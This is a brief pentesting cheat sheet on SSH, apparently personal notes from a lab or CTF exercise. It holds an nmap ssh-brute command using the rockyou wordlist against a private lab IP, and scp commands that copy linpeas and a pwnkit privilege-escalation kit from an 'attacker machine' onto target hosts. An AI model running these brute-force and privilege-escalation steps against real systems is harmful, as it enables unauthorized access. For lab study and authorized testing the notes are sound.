# SSH

## Ports
- 22

## Resources
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh

## Brute force

### Resources

- https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/

### nmap

    nmap 192.168.56.108 -p 22 --script ssh-brute --script-args userdb=/kali-share/downloads/viking2.dic,passdb=/usr/share/wordlists/rockyou.txt

## Upload
Syntax:

    scp <source> <destination>
To copy a file from B to A while logged into B:

    scp /path/to/file username@a:/path/to/destination
To copy a file from B to A while logged into A:

    scp username@b:/path/to/file /path/to/destination
Folder

    scp -r ~/local_dir user@host.com:/var/www/html/target_dir

Examples:

From attacker machine

    scp linpeas.sh floki@192.168.56.108:~/linpeas.sh
    scp -r ~/privesc/linux/pwnkit webmaster@192.168.56.111:~/
                                                                                              100%  806KB  34.0MB/s   00:00  